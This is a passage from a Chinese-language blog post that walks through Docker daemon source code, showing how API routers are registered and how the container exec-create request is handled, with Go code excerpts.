</span><span class="c1"></span>        <span class="nx">checkpointrouter</span><span class="p">.</span><span class="nf">NewRouter</span><span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">daemon</span><span class="p">,</span> <span class="nx">decoder</span><span class="p">),</span>
        <span class="nx">container</span><span class="p">.</span><span class="nf">NewRouter</span><span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">daemon</span><span class="p">,</span> <span class="nx">decoder</span><span class="p">,</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">daemon</span><span class="p">.</span><span class="nf">RawSysInfo</span><span class="p">(</span><span class="kc">true</span><span class="p">).</span><span class="nx">CgroupUnified</span><span class="p">),</span>
        <span class="nx">image</span><span class="p">.</span><span class="nf">NewRouter</span><span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">daemon</span><span class="p">.</span><span class="nf">ImageService</span><span class="p">()),</span>
        <span class="nx">systemrouter</span><span class="p">.</span><span class="nf">NewRouter</span><span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">daemon</span><span class="p">,</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">cluster</span><span class="p">,</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">buildkit</span><span class="p">,</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">features</span><span class="p">),</span>
        <span class="nx">volume</span><span class="p">.</span><span class="nf">NewRouter</span><span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">daemon</span><span class="p">.</span><span class="nf">VolumesService</span><span class="p">()),</span>
        <span class="nx">build</span><span class="p">.</span><span class="nf">NewRouter</span><span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">buildBackend</span><span class="p">,</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">daemon</span><span class="p">,</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">features</span><span class="p">),</span>
        <span class="nx">sessionrouter</span><span class="p">.</span><span class="nf">NewRouter</span><span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">sessionManager</span><span class="p">),</span>
        <span class="nx">swarmrouter</span><span class="p">.</span><span class="nf">NewRouter</span><span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">cluster</span><span class="p">),</span>
        <span class="nx">pluginrouter</span><span class="p">.</span><span class="nf">NewRouter</span><span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">daemon</span><span class="p">.</span><span class="nf">PluginManager</span><span class="p">()),</span>
        <span class="nx">distributionrouter</span><span class="p">.</span><span class="nf">NewRouter</span><span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">daemon</span><span class="p">.</span><span class="nf">ImageService</span><span class="p">()),</span>
    <span class="p">}</span>

    <span class="o">...</span>
    <span class="nx">opts</span><span class="p">.</span><span class="nx">api</span><span class="p">.</span><span class="nf">InitRouter</span><span class="p">(</span><span class="nx">routers</span><span class="o">...</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><code>InitRouter()</code>函数被调用，它会将传入的routers信息添加到Server.routers中。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="nx">serveAPIWait</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kt">error</span><span class="p">)</span>
<span class="k">go</span> <span class="nx">cli</span><span class="p">.</span><span class="nx">api</span><span class="p">.</span><span class="nf">Wait</span><span class="p">(</span><span class="nx">serveAPIWait</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>这里的<code>Wait()</code>函数调用的是<code>components/engine/api/server/server.go</code>中的<code>Wait()</code>函数。<code>Wait()-&gt;s.serverAPI()-&gt;s.createMux()</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="c1">// Wait blocks the server goroutine until it exits.
</span><span class="c1">// It sends an error message if there is any error during
</span><span class="c1">// the API execution.
</span><span class="c1"></span><span class="kd">func</span> <span class="p">(</span><span class="nx">s</span> <span class="o">*</span><span class="nx">Server</span><span class="p">)</span> <span class="nf">Wait</span><span class="p">(</span><span class="nx">waitChan</span> <span class="kd">chan</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">s</span><span class="p">.</span><span class="nf">serveAPI</span><span class="p">();</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="nx">logrus</span><span class="p">.</span><span class="nf">Errorf</span><span class="p">(</span><span class="s">&#34;ServeAPI error: %v&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
        <span class="nx">waitChan</span> <span class="o">&lt;-</span> <span class="nx">err</span>
        <span class="k">return</span>
    <span class="p">}</span>
    <span class="nx">waitChan</span> <span class="o">&lt;-</span> <span class="kc">nil</span>
<span class="p">}</span>


<span class="c1">// serveAPI loops through all initialized servers and spawns goroutine
</span><span class="c1">// with Serve method for each. It sets createMux() as Handler also.
</span><span class="c1"></span><span class="kd">func</span> <span class="p">(</span><span class="nx">s</span> <span class="o">*</span><span class="nx">Server</span><span class="p">)</span> <span class="nf">serveAPI</span><span class="p">()</span> <span class="kt">error</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">chErrors</span> <span class="p">=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kt">error</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="nx">s</span><span class="p">.</span><span class="nx">servers</span><span class="p">))</span>
    <span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">srv</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">s</span><span class="p">.</span><span class="nx">servers</span> <span class="p">{</span>
        <span class="nx">srv</span><span class="p">.</span><span class="nx">srv</span><span class="p">.</span><span class="nx">Handler</span> <span class="p">=</span> <span class="nx">s</span><span class="p">.</span><span class="nf">createMux</span><span class="p">()</span>
        <span class="k">go</span> <span class="kd">func</span><span class="p">(</span><span class="nx">srv</span> <span class="o">*</span><span class="nx">HTTPServer</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">err</span> <span class="kt">error</span>
            <span class="nx">logrus</span><span class="p">.</span><span class="nf">Infof</span><span class="p">(</span><span class="s">&#34;API listen on %s&#34;</span><span class="p">,</span> <span class="nx">srv</span><span class="p">.</span><span class="nx">l</span><span class="p">.</span><span class="nf">Addr</span><span class="p">())</span>
            <span class="k">if</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">srv</span><span class="p">.</span><span class="nf">Serve</span><span class="p">();</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="o">&amp;&amp;</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">err</span><span class="p">.</span><span class="nf">Error</span><span class="p">(),</span> <span class="s">&#34;use of closed network connection&#34;</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">err</span> <span class="p">=</span> <span class="kc">nil</span>
            <span class="p">}</span>
            <span class="nx">chErrors</span> <span class="o">&lt;-</span> <span class="nx">err</span>
        <span class="p">}(</span><span class="nx">srv</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="k">for</span> <span class="k">range</span> <span class="nx">s</span><span class="p">.</span><span class="nx">servers</span> <span class="p">{</span>
        <span class="nx">err</span> <span class="o">:=</span> <span class="o">&lt;-</span><span class="nx">chErrors</span>
        <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">err</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="kc">nil</span>
<span class="p">}</span>

<span class="c1">// createMux initializes the main router the server uses.
</span><span class="c1"></span><span class="kd">func</span> <span class="p">(</span><span class="nx">s</span> <span class="o">*</span><span class="nx">Server</span><span class="p">)</span> <span class="nf">createMux</span><span class="p">()</span> <span class="o">*</span><span class="nx">mux</span><span class="p">.</span><span class="nx">Router</span> <span class="p">{</span>
    <span class="nx">m</span> <span class="o">:=</span> <span class="nx">mux</span><span class="p">.</span><span class="nf">NewRouter</span><span class="p">()</span>
    
    <span class="nx">logrus</span><span class="p">.</span><span class="nf">Debug</span><span class="p">(</span><span class="s">&#34;Registering routers&#34;</span><span class="p">)</span>
    <span class="c1">//遍历之前传入的routers变量，注册路由
</span><span class="c1"></span>    <span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">apiRouter</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">s</span><span class="p">.</span><span class="nx">routers</span> <span class="p">{</span>
        <span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">r</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">apiRouter</span><span class="p">.</span><span class="nf">Routes</span><span class="p">()</span> <span class="p">{</span>
            <span class="nx">f</span> <span class="o">:=</span> <span class="nx">s</span><span class="p">.</span><span class="nf">makeHTTPHandler</span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nf">Handler</span><span class="p">())</span>

            <span class="nx">logrus</span><span class="p">.</span><span class="nf">Debugf</span><span class="p">(</span><span class="s">&#34;Registering %s, %s&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nf">Method</span><span class="p">(),</span> <span class="nx">r</span><span class="p">.</span><span class="nf">Path</span><span class="p">())</span>
            <span class="nx">m</span><span class="p">.</span><span class="nf">Path</span><span class="p">(</span><span class="nx">versionMatcher</span> <span class="o">+</span> <span class="nx">r</span><span class="p">.</span><span class="nf">Path</span><span class="p">()).</span><span class="nf">Methods</span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nf">Method</span><span class="p">()).</span><span class="nf">Handler</span><span class="p">(</span><span class="nx">f</span><span class="p">)</span>
            <span class="nx">m</span><span class="p">.</span><span class="nf">Path</span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nf">Path</span><span class="p">()).</span><span class="nf">Methods</span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nf">Method</span><span class="p">()).</span><span class="nf">Handler</span><span class="p">(</span><span class="nx">f</span><span class="p">)</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="nx">debugRouter</span> <span class="o">:=</span> <span class="nx">debug</span><span class="p">.</span><span class="nf">NewRouter</span><span class="p">()</span>
    <span class="nx">s</span><span class="p">.</span><span class="nx">routers</span> <span class="p">=</span> <span class="nb">append</span><span class="p">(</span><span class="nx">s</span><span class="p">.</span><span class="nx">routers</span><span class="p">,</span> <span class="nx">debugRouter</span><span class="p">)</span>
    <span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">r</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">debugRouter</span><span class="p">.</span><span class="nf">Routes</span><span class="p">()</span> <span class="p">{</span>
        <span class="nx">f</span> <span class="o">:=</span> <span class="nx">s</span><span class="p">.</span><span class="nf">makeHTTPHandler</span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nf">Handler</span><span class="p">())</span>
        <span class="nx">m</span><span class="p">.</span><span class="nf">Path</span><span class="p">(</span><span class="s">&#34;/debug&#34;</span> <span class="o">+</span> <span class="nx">r</span><span class="p">.</span><span class="nf">Path</span><span class="p">()).</span><span class="nf">Handler</span><span class="p">(</span><span class="nx">f</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="nx">notFoundHandler</span> <span class="o">:=</span> <span class="nx">httputils</span><span class="p">.</span><span class="nf">MakeErrorHandler</span><span class="p">(</span><span class="nx">pageNotFoundError</span><span class="p">{})</span>
    <span class="nx">m</span><span class="p">.</span><span class="nf">HandleFunc</span><span class="p">(</span><span class="nx">versionMatcher</span><span class="o">+</span><span class="s">&#34;/{path:.*}&#34;</span><span class="p">,</span> <span class="nx">notFoundHandler</span><span class="p">)</span>
    <span class="nx">m</span><span class="p">.</span><span class="nx">NotFoundHandler</span> <span class="p">=</span> <span class="nx">notFoundHandler</span>
    <span class="nx">m</span><span class="p">.</span><span class="nx">MethodNotAllowedHandler</span> <span class="p">=</span> <span class="nx">notFoundHandler</span>

    <span class="k">return</span> <span class="nx">m</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>容器类的路由信息在<code>components/engine/api/server/router/container/container.go</code>的<code>initRoutes()</code>函数中可以看到</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="c1">// initRoutes initializes the routes in container router
</span><span class="c1"></span><span class="kd">func</span> <span class="p">(</span><span class="nx">r</span> <span class="o">*</span><span class="nx">containerRouter</span><span class="p">)</span> <span class="nf">initRoutes</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">r</span><span class="p">.</span><span class="nx">routes</span> <span class="p">=</span> <span class="p">[]</span><span class="nx">router</span><span class="p">.</span><span class="nx">Route</span><span class="p">{</span>
        <span class="c1">// HEAD
</span><span class="c1"></span>        <span class="nx">router</span><span class="p">.</span><span class="nf">NewHeadRoute</span><span class="p">(</span><span class="s">&#34;/containers/{name:.*}/archive&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">headContainersArchive</span><span class="p">),</span>
        <span class="c1">// GET
</span><span class="c1"></span>        <span class="nx">router</span><span class="p">.</span><span class="nf">NewGetRoute</span><span class="p">(</span><span class="s">&#34;/containers/json&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">getContainersJSON</span><span class="p">),</span>
        <span class="nx">router</span><span class="p">.</span><span class="nf">NewGetRoute</span><span class="p">(</span><span class="s">&#34;/containers/{name:.*}/export&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">getContainersExport</span><span class="p">),</span>
        <span class="nx">router</span><span class="p">.</span><span class="nf">NewGetRoute</span><span class="p">(</span><span class="s">&#34;/containers/{name:.*}/changes&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">getContainersChanges</span><span class="p">),</span>
        <span class="nx">router</span><span class="p">.</span><span class="nf">NewGetRoute</span><span class="p">(</span><span class="s">&#34;/containers/{name:.*}/json&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">getContainersByName</span><span class="p">),</span>
        <span class="nx">router</span><span class="p">.</span><span class="nf">NewGetRoute</span><span class="p">(</span><span class="s">&#34;/containers/{name:.*}/top&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">getContainersTop</span><span class="p">),</span>
        <span class="nx">router</span><span class="p">.</span><span class="nf">NewGetRoute</span><span class="p">(</span><span class="s">&#34;/containers/{name:.*}/logs&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">getContainersLogs</span><span class="p">),</span>
        <span class="nx">router</span><span class="p">.</span><span class="nf">NewGetRoute</span><span class="p">(</span><span class="s">&#34;/containers/{name:.*}/stats&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">getContainersStats</span><span class="p">),</span>
        <span class="nx">router</span><span class="p">.</span><span class="nf">NewGetRoute</span><span class="p">(</span><span class="s">&#34;/containers/{name:.*}/attach/ws&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">wsContainersAttach</span><span class="p">),</span>
        <span class="nx">router</span><span class="p">.</span><span class="nf">NewGetRoute</span><span class="p">(</span><span class="s">&#34;/exec/{id:.*}/json&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">getExecByID</span><span class="p">),</span>
        <span class="nx">router</span><span class="p">.</span><span class="nf">NewGetRoute</span><span class="p">(</span><span class="s">&#34;/containers/{name:.*}/archive&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">getContainersArchive</span><span class="p">),</span>
        <span class="c1">// POST
</span><span class="c1"></span>        <span class="nx">router</span><span class="p">.</span><span class="nf">NewPostRoute</span><span class="p">(</span><span class="s">&#34;/containers/create&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">postContainersCreate</span><span class="p">),</span>
        <span class="nx">router</span><span class="p">.</span><span class="nf">NewPostRoute</span><span class="p">(</span><span class="s">&#34;/containers/{name:.*}/kill&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">postContainersKill</span><span class="p">),</span>
        <span class="nx">router</span><span class="p">.</span><span class="nf">NewPostRoute</span><span class="p">(</span><span class="s">&#34;/containers/{name:.*}/pause&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">postContainersPause</span><span class="p">),</span>
        <span class="nx">router</span><span class="p">.</span><span class="nf">NewPostRoute</span><span class="p">(</span><span class="s">&#34;/containers/{name:.*}/unpause&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">postContainersUnpause</span><span class="p">),</span>
        <span class="nx">router</span><span class="p">.</span><span class="nf">NewPostRoute</span><span class="p">(</span><span class="s">&#34;/containers/{name:.*}/restart&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">postContainersRestart</span><span class="p">),</span>
        <span class="nx">router</span><span class="p">.</span><span class="nf">NewPostRoute</span><span class="p">(</span><span class="s">&#34;/containers/{name:.*}/start&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">postContainersStart</span><span class="p">),</span>
        <span class="nx">router</span><span class="p">.</span><span class="nf">NewPostRoute</span><span class="p">(</span><span class="s">&#34;/containers/{name:.*}/stop&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">postContainersStop</span><span class="p">),</span>
        <span class="nx">router</span><span class="p">.</span><span class="nf">NewPostRoute</span><span class="p">(</span><span class="s">&#34;/containers/{name:.*}/wait&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">postContainersWait</span><span class="p">),</span>
        <span class="nx">router</span><span class="p">.</span><span class="nf">NewPostRoute</span><span class="p">(</span><span class="s">&#34;/containers/{name:.*}/resize&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">postContainersResize</span><span class="p">),</span>
        <span class="nx">router</span><span class="p">.</span><span class="nf">NewPostRoute</span><span class="p">(</span><span class="s">&#34;/containers/{name:.*}/attach&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">postContainersAttach</span><span class="p">),</span>
        <span class="nx">router</span><span class="p">.</span><span class="nf">NewPostRoute</span><span class="p">(</span><span class="s">&#34;/containers/{name:.*}/copy&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">postContainersCopy</span><span class="p">),</span> <span class="c1">// Deprecated since 1.8, Errors out since 1.12
</span><span class="c1"></span>        <span class="nx">router</span><span class="p">.</span><span class="nf">NewPostRoute</span><span class="p">(</span><span class="s">&#34;/containers/{name:.*}/exec&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">postContainerExecCreate</span><span class="p">),</span>
        <span class="nx">router</span><span class="p">.</span><span class="nf">NewPostRoute</span><span class="p">(</span><span class="s">&#34;/exec/{name:.*}/start&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">postContainerExecStart</span><span class="p">),</span>
        <span class="nx">router</span><span class="p">.</span><span class="nf">NewPostRoute</span><span class="p">(</span><span class="s">&#34;/exec/{name:.*}/resize&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">postContainerExecResize</span><span class="p">),</span>
        <span class="nx">router</span><span class="p">.</span><span class="nf">NewPostRoute</span><span class="p">(</span><span class="s">&#34;/containers/{name:.*}/rename&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">postContainerRename</span><span class="p">),</span>
        <span class="nx">router</span><span class="p">.</span><span class="nf">NewPostRoute</span><span class="p">(</span><span class="s">&#34;/containers/{name:.*}/update&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">postContainerUpdate</span><span class="p">),</span>
        <span class="nx">router</span><span class="p">.</span><span class="nf">NewPostRoute</span><span class="p">(</span><span class="s">&#34;/containers/prune&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">postContainersPrune</span><span class="p">),</span>
        <span class="nx">router</span><span class="p">.</span><span class="nf">NewPostRoute</span><span class="p">(</span><span class="s">&#34;/commit&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">postCommit</span><span class="p">),</span>
        <span class="c1">// PUT
</span><span class="c1"></span>        <span class="nx">router</span><span class="p">.</span><span class="nf">NewPutRoute</span><span class="p">(</span><span class="s">&#34;/containers/{name:.*}/archive&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">putContainersArchive</span><span class="p">),</span>
        <span class="c1">// DELETE
</span><span class="c1"></span>        <span class="nx">router</span><span class="p">.</span><span class="nf">NewDeleteRoute</span><span class="p">(</span><span class="s">&#34;/containers/{name:.*}&#34;</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">deleteContainers</span><span class="p">),</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>再结合之前docker-client发送的<a href="#post" rel="">post请求信息</a>，Daemon会执行<code>r.postContainerExecCreate</code>。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="p">(</span><span class="nx">s</span> <span class="o">*</span><span class="nx">containerRouter</span><span class="p">)</span> <span class="nf">postContainerExecCreate</span><span class="p">(</span><span class="nx">ctx</span> <span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span> <span class="nx">w</span> <span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span> <span class="nx">r</span> <span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">,</span> <span class="nx">vars</span> <span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
    <span class="o">...</span>
    
    <span class="c1">// Register an instance of Exec in container.
</span><span class="c1"></span>    <span class="nx">id</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">s</span><span class="p">.</span><span class="nx">backend</span><span class="p">.</span><span class="nf">ContainerExecCreate</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">execConfig</span><span class="p">)</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="nx">logrus</span><span class="p">.</span><span class="nf">Errorf</span><span class="p">(</span><span class="s">&#34;Error setting up exec command in container %s: %v&#34;</span><span class="p">,</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
        <span class="k">return</span> <span class="nx">err</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="nx">httputils</span><span class="p">.</span><span class="nf">WriteJSON</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="nx">http</span><span class="p">.</span><span class="nx">StatusCreated</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">types</span><span class="p">.</span><span class="nx">IDResponse</span><span class="p">{</span>
        <span class="nx">ID</span><span class="p">:</span> <span class="nx">id</span><span class="p">,</span>
    <span class="p">})</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><code>postContainerExecCreate()</code>函数再调用<code>components/engine/daemon/exec.go</code>中的<code>ContainerExecCreate()</code>，该函数会注册execConfig信息</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="c1">// ContainerExecCreate sets up an exec in a running container.
</span><span class="c1"></span><span class="kd">func</span> <span class="p">(</span><span class="nx">daemon</span> <span class="o">*</span><span class="nx">Daemon</span><span class="p">)</span> <span class="nf">ContainerExecCreate</span><span class="p">(</span><span class="nx">name</span> <span class="kt">string</span><span class="p">,</span> <span class="nx">config</span> <span class="o">*</span><span class="nx">types</span><span class="p">.</span><span class="nx">ExecConfig</span><span class="p">)</span> <span class="p">(</span><span class="kt">string</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
    <span class="o">...</span>

    <span class="nx">execConfig</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">NewConfig</span><span class="p">()</span>
    <span class="nx">execConfig</span><span class="p">.</span><span class="nx">OpenStdin</span> <span class="p">=</span> <span class="nx">config</span><span class="p">.</span><span class="nx">AttachStdin</span>
    <span class="nx">execConfig</span><span class="p">.</span><span class="nx">OpenStdout</span> <span class="p">=</span> <span class="nx">config</span><span class="p">.</span><span class="nx">AttachStdout</span>
    <span class="nx">execConfig</span><span class="p">.</span><span class="nx">OpenStderr</span> <span class="p">=</span> <span class="nx">config</span><span class="p">.</span><span class="nx">AttachStderr</span>
    <span class="nx">execConfig</span><span class="p">.</span><span class="nx">ContainerID</span> <span class="p">=</span> <span class="nx">cntr</span><span class="p">.</span><span class="nx">ID</span>
    <span class="nx">execConfig</span><span class="p">.</span><span class="nx">DetachKeys</span> <span class="p">=</span> <span class="nx">keys</span>
    <span class="nx">execConfig</span><span class="p">.</span><span class="nx">Entrypoint</span> <span class="p">=</span> <span class="nx">entrypoint</span>
